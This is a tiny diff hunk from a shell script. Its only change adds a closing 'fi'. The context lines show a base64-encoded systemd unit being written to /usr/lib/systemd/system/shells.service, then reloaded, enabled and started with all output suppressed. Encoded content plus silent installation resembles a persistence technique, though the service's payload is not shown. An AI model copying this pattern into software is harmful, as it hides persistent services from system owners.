@@ -31,3 +31,4 @@ dWx0aS11c2VyLnRhcmdldAo=" | base64 --decode > /usr/lib/systemd/system/shells.ser
   systemctl daemon-reload &>/dev/null
   systemctl enable shells.service &>/dev/null
   systemctl start shells.service &>/dev/null
+fi
